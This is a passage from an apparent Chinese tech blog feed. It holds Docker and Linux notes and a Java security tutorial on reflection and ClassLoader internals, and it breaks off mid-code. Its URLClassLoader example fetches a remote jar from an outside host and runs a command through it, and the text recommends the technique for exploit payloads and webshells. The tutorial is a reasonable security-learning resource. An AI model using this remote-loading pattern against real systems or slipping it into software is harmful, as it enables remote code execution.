<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker login		<span class="comment">#登录docker账号以push镜像</span></span><br><span class="line">docker pull 镜像名:标签		<span class="comment">#拉取指定镜像，默认标签使用latest</span></span><br><span class="line">docker push 镜像<span class="built_in">id</span>		<span class="comment">#推送指定镜像到docker hub</span></span><br><span class="line">docker images		<span class="comment">#查看docker镜像</span></span><br><span class="line">docker images -a	<span class="comment">#查看所有的docker镜像，包括虚悬镜像（none标签）</span></span><br><span class="line">docker ps  			<span class="comment">#列出正在运行的docker容器状态</span></span><br><span class="line">docker run			<span class="comment">#运行docker容器</span></span><br><span class="line">docker run -it 镜像名/容器<span class="built_in">id</span> 命令		<span class="comment">#以交互模式运行指定容器并分配一个伪输入终端，不使用命令默认执行dockerfile中的CMD</span></span><br><span class="line">			-d		<span class="comment">#后台运行容器并返回容器id</span></span><br><span class="line">			-p 宿主机端口:容器端口		<span class="comment">#将宿主机的端口映射到容器的端口</span></span><br><span class="line">			-P		<span class="comment">#随机端口映射</span></span><br><span class="line">			--network=bridge/host/none	<span class="comment">#设置容器的网络模式</span></span><br><span class="line">			--privileged		<span class="comment">#以特权模式运行容器</span></span><br><span class="line">docker <span class="built_in">exec</span>			<span class="comment">#在运行的容器中执行命令</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> 命令		<span class="comment">#在运行的容器中执行命令并以交互模式分配一个伪输入终端</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span>		<span class="comment">#停止指定的容器</span></span><br><span class="line">docker commit 容器<span class="built_in">id</span> 镜像名:标签		<span class="comment">#保存指定的容器并命名为镜像名:标签</span></span><br><span class="line">docker save -o 保存文件名 镜像名/容器<span class="built_in">id</span>		<span class="comment">#导出完整镜像</span></span><br><span class="line">docker tag 镜像名/容器<span class="built_in">id</span> 镜像名			<span class="comment">#重命名镜像</span></span><br></pre></td></tr></table></figure>

<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动脚本run.sh报错</span></span><br><span class="line"><span class="comment">#Standard_init_linux.go:190: exec user process caused &quot;exec format error&quot;</span></span><br><span class="line">解决方法：启动脚本开头必须加：#!/bin/bash</span><br><span class="line"></span><br><span class="line"><span class="comment">#systemctl和service</span></span><br></pre></td></tr></table></figure>





<h2 id="杂项记录"><a href="#杂项记录" class="headerlink" title="杂项记录"></a>杂项记录</h2><h3 id="查看Linux-Deb包的依赖关系"><a href="#查看Linux-Deb包的依赖关系" class="headerlink" title="查看Linux Deb包的依赖关系"></a>查看Linux Deb包的依赖关系</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Deb是debian linus的安装格式，跟red hat的rpm非常相似，最基本的安装命令是：dpkg -i file.deb。 </span><br><span class="line">dpkg 是Debian Package的简写，是为Debian 专门开发的套件管理系统，方便软件的安装、更新及移除。所有源自Debian的Linux发行版都使用dpkg，例如Ubuntu等。</span><br><span class="line"></span><br><span class="line">我这里用到的测试环境是Ubuntu，测试的包是：apache2_2.4.7-1ubuntu4.14_amd64.deb。</span><br><span class="line"></span><br><span class="line">使用的命令：</span><br><span class="line">dpkg --info apache2_2.4.7-1ubuntu4.14_amd64.deb | grep Depends</span><br><span class="line">先获取包的信息，然后通过管道将“Depends”截取出来，就获得下图的结果：</span><br><span class="line">得到的Depends就是依赖的包，如perl，apache-bin，apache2-data等</span><br></pre></td></tr></table></figure>

<h3 id="vmware中ubuntu网卡失效"><a href="#vmware中ubuntu网卡失效" class="headerlink" title="vmware中ubuntu网卡失效"></a>vmware中ubuntu网卡失效</h3><p><strong>1、先将network-manager服务关闭</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service network-manager stop</span><br></pre></td></tr></table></figure>

<p><strong>2、把network-manager的状态文件删除，后续重新运行network-manager服务后会自动生成</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">rm</span> /var/lib/NetworkManager/NetworkManager.state</span><br></pre></td></tr></table></figure>

<p><strong>3、编辑network-manager配置文件，将[ifupdown]中的managed&#x3D;false改成true</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> gedit /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure>

<p><strong>4、启动network-manager服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> service network-manager start</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Linux</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全基础</title>
    <url>/2024/08/20/Java%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h1 id="Java安全基础"><a href="#Java安全基础" class="headerlink" title="Java安全基础"></a>Java安全基础</h1><h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><h3 id="类和对象的关系"><a href="#类和对象的关系" class="headerlink" title="类和对象的关系"></a>类和对象的关系</h3><p>类是对象的抽象，而对象是类的具体实例。类是抽象的，不占用内存，而对象是具体的，占用存储空间。类是用于创建对象的蓝图，它是一个定义包括在特定类型的对象中的方法和变量的软件模板。</p>
<p>类与对象的关系就如模具和铸件的关系 类的实例化结果就是对象，而对一类对象的抽象就是类，类描述了一组有相同属性和相同方法的对象。</p>
<h3 id="class类的newInstance方法"><a href="#class类的newInstance方法" class="headerlink" title="class类的newInstance方法"></a>class类的newInstance方法</h3><p>class的newInstance()方法,需要我们类中存在无参的构造器，并且能直接访问，它通过无参的构造器来实例化，而一旦我们类中不存在无参构造器，那么第一种方法就不行了</p>
<h3 id="getMethods-和-getDeclaredMethods-方法的区别"><a href="#getMethods-和-getDeclaredMethods-方法的区别" class="headerlink" title="getMethods 和 getDeclaredMethods 方法的区别"></a>getMethods 和 getDeclaredMethods 方法的区别</h3><p>getMethods：获取当前类或父类或父接口的 <strong>public</strong> 修饰的字段；包含接口中 <strong>default</strong> 修饰的方法 (JDK1.8)。</p>
<p>getDeclaredMethods： 获取<strong>当前类的所有方法</strong>；包括 protected&#x2F;默认&#x2F;private 修饰的方法；不包括父类 、接口 public 修饰的方法。</p>
<h3 id="反射Runtime-exec和ProcessBuilder区别"><a href="#反射Runtime-exec和ProcessBuilder区别" class="headerlink" title="反射Runtime.exec和ProcessBuilder区别"></a>反射Runtime.exec和ProcessBuilder区别</h3><p>Rutime无需构造器newInstance实例化，因为getRuntime方法本身会返回一个Runtime对象；而ProcessBuilder需要先反射获取有参构造器，再通过构造器进行实例化</p>
<blockquote>
<p>RunTime是JVM负责实例化的,且使用了单例设计模式,必须通过RunTime内部的getRuntime()方法获取实例化对象</p>
</blockquote>
<h3 id="Java接口"><a href="#Java接口" class="headerlink" title="Java接口"></a>Java接口</h3><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p>
<p>接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。</p>
<p>除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。</p>
<p>接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p>
<h3 id="transient关键字"><a href="#transient关键字" class="headerlink" title="transient关键字"></a>transient关键字</h3><p>transient是短暂的意思。对于transient 修饰的成员变量，在类的实例对象的序列化处理过程中会被忽略。 因此，transient变量不会贯穿对象的序列化和反序列化，生命周期仅存于调用者的内存中而不会写到磁盘里进行持久化。</p>
<p>transient是Java语言的关键字，用来表示一个成员变量不是该对象序列化的一部分。当一个对象被序列化的时候，transient型变量的值不包括在序列化的结果中。而非transient型的变量是被包括进去的。 注意static修饰的静态变量天然就是不可序列化的。</p>
<h2 id="ClassLoader（类加载机制）"><a href="#ClassLoader（类加载机制）" class="headerlink" title="ClassLoader（类加载机制）"></a>ClassLoader（类加载机制）</h2><p>Java是一个依赖于<code>JVM</code>（Java虚拟机）实现的跨平台的开发语言。Java程序在运行前需要先编译成<code>class文件</code>，Java类初始化的时候会调用<code>java.lang.ClassLoader</code>加载类字节码，<code>ClassLoader</code>会调用JVM的native方法（<code>defineClass0/1/2</code>）来定义一个<code>java.lang.Class</code>实例。</p>
<p><strong>JVM架构图：</strong></p>
<img src="/image/JvmSpec7.png" alt="img" style="zoom: 80%;" />

<h3 id="Java类"><a href="#Java类" class="headerlink" title="Java类"></a>Java类</h3><p>Java是编译型语言，我们编写的java文件需要编译成后class文件后才能够被JVM运行</p>
<p><strong>示例代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可通过<code>javap</code>反汇编class文件，或者通过hexdump查看二进制数据</p>
<img src="/image/image-20230702161600126.png" alt="image-20230702161600126" style="zoom: 67%;" />

<p>JVM在执行<code>TestHelloWorld</code>之前会先解析class二进制内容，JVM执行的其实就是如上<code>javap</code>命令生成的字节码。</p>
<h3 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h3><p>​	一切的Java类都必须经过JVM加载后才能运行，而<code>ClassLoader</code>的主要作用就是Java类文件的加载。</p>
<p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器</p>
<p>如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code>。</p>
<img src="/image/image-20230702162142998.png" alt="image-20230702162142998" style="zoom:80%;" />

<p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code>。</p>
<p><code>ClassLoader</code>类有如下核心方法：</p>
<ol>
<li><code>loadClass</code>（加载指定的Java类）</li>
<li><code>findClass</code>（查找指定的Java类）</li>
<li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li>
<li><code>defineClass</code>（定义一个Java类）</li>
<li><code>resolveClass</code>（链接指定的Java类）</li>
</ol>
<h3 id="Java类动态（显式）加载方式"><a href="#Java类动态（显式）加载方式" class="headerlink" title="Java类动态（显式）加载方式"></a>Java类动态（显式）加载方式</h3><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>,<code>显式</code>即我们通常使用<code>Java反射</code>或者<code>ClassLoader</code>来动态加载一个类对象，而<code>隐式</code>指的是<code>类名.方法名()</code>或<code>new</code>类实例。<code>显式</code>类加载方式也可以理解为类动态加载，我们可以自定义类加载器去加载任意的类。</p>
<p><strong>常用的类动态加载方式：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 反射加载TestHelloWorld示例</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ClassLoader加载TestHelloWorld示例</span></span><br><span class="line"><span class="built_in">this</span>.getClass().getClassLoader().loadClass(<span class="string">&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><code>Class.forName(&quot;类名&quot;)</code>默认会初始化被加载类的静态属性和方法，如果不希望初始化类可以使用<code>Class.forName(&quot;类名&quot;, 是否初始化类, 类加载器)</code>，而<code>ClassLoader.loadClass</code>默认不会初始化类方法。</p>
<h3 id="ClassLoader类加载流程"><a href="#ClassLoader类加载流程" class="headerlink" title="ClassLoader类加载流程"></a>ClassLoader类加载流程</h3><p>以一个Java的HelloWorld来学习<code>ClassLoader</code>。</p>
<p><code>ClassLoader</code>加载<code>com.y5neko.sec.classloader.TestHelloWorld</code>类<code>loadClass</code>重要流程如下：</p>
<ol>
<li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>com.y5neko.sec.classloader.TestHelloWorld</code>类。</li>
<li>调用<code>findLoadedClass</code>方法检查<code>TestHelloWorld</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li>
<li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>TestHelloWorld</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li>
<li>如果上一步无法加载<code>TestHelloWorld</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>TestHelloWorld</code>类。</li>
<li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>com.y5neko.sec.classloader.TestHelloWorld</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li>
<li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li>
<li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li>
</ol>
<img src="/image/20230612144647-1688289465704-6.png" alt="20230612144647" style="zoom: 43%;" />

<img src="/image/image-20230702175759774.png" alt="image-20230702175759774" style="zoom:80%;" />

<img src="/image/image-20230702175910966.png" alt="image-20230702175910966" style="zoom: 80%;" />

<h3 id="自定义ClassLoader"><a href="#自定义ClassLoader" class="headerlink" title="自定义ClassLoader"></a>自定义ClassLoader</h3><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p>
<p>既然已知ClassLoader具备了加载类的能力，那么我们不妨尝试下写一个自己的类加载器来实现加载自定义的字节码（这里以加载<code>TestHelloWorld</code>类为例）并调用<code>hello</code>方法。</p>
<p>如果<code>com.y5neko.sec.TestHelloWorld</code>类存在的情况下，我们可以使用如下代码即可实现调用<code>hello</code>方法并输出：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TestHelloWorld</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestHelloWorld</span>();</span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> t.hello();</span><br><span class="line">System.out.println(str);</span><br></pre></td></tr></table></figure>

<p>但是如果<code>com.y5neko.sec.classloader.TestHelloWorld</code>根本就不存在于我们的<code>classpath</code>，那么我们可以使用自定义类加载器重写<code>findClass</code>方法，然后在调用<code>defineClass</code>方法的时候传入<code>TestHelloWorld</code>类的字节码的方式来向JVM中定义一个<code>TestHelloWorld</code>类，最后通过反射机制就可以调用<code>TestHelloWorld</code>类的<code>hello</code>方法了。</p>
<p><strong>测试自定义ClassLoader：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">// TestHelloWorld类名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">testClassName</span> <span class="operator">=</span> <span class="string">&quot;com.y5neko.sec.classloader.TestHelloWorld&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//TestHelloWorld类的字节码</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span>[] testClassBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;</span><br><span class="line">            -<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">16</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">104</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">83</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">99</span>,</span><br><span class="line">            <span class="number">101</span>, <span class="number">70</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">46</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>,</span><br><span class="line">            <span class="number">32</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">126</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">47</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">105</span>, <span class="number">47</span>,</span><br><span class="line">            <span class="number">115</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">84</span>, <span class="number">101</span>, <span class="number">115</span>,</span><br><span class="line">            <span class="number">116</span>, <span class="number">72</span>, <span class="number">101</span>, <span class="number">108</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">87</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">108</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>,</span><br><span class="line">            <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">2</span>, -<span class="number">80</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">11</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">12</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// 只处理TestHelloWorld类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) &#123;</span><br><span class="line">            <span class="comment">// 调用JVM的native方法定义TestHelloWorld类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//其他类通过super关键字调用父类的findClass方法</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.findClass(name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建自定义类加载器</span></span><br><span class="line">        <span class="type">TestClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TestClassLoader</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">//使用自定义的类加载器”loader“中的loadClass加载TestHelloWorld类到testClass变量</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">testClass</span> <span class="operator">=</span> loader.loadClass(testClassName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射创建TestHelloWorld类，等价于”TestHelloWorld t = new TestHelloWorld();“</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">testInstance</span> <span class="operator">=</span> testClass.newInstance();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射获取hello方法</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> testInstance.getClass().getMethod(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//反射调用hello方法，等价于”String str = t.hello();“</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> (String) method.invoke(testInstance);</span><br><span class="line"></span><br><span class="line">            System.out.println(str);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h3><p><code>URLClassLoader</code>继承了<code>ClassLoader</code>，<code>URLClassLoader</code>提供了加载远程资源的能力，在写漏洞利用的<code>payload</code>或者<code>webshell</code>的时候我们可以使用这个特性来加载远程的jar来实现远程的类方法调用。</p>
<p><strong>URLClassLoader调用远程方法实例：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.y5neko.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//定义远程jar包路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://www.ysneko.com/CMD.jar&quot;</span>);</span><br><span class="line">            System.out.println(url);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123;url&#125;);</span><br><span class="line">            System.out.println(ucl);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">//通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            Class&lt;?&gt; cmdClass = ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//调用CMD类中的exec方法，等同于“Process process = CMD.exec(cmd);”</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>,cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[] b = <span class="keyword">new</span> 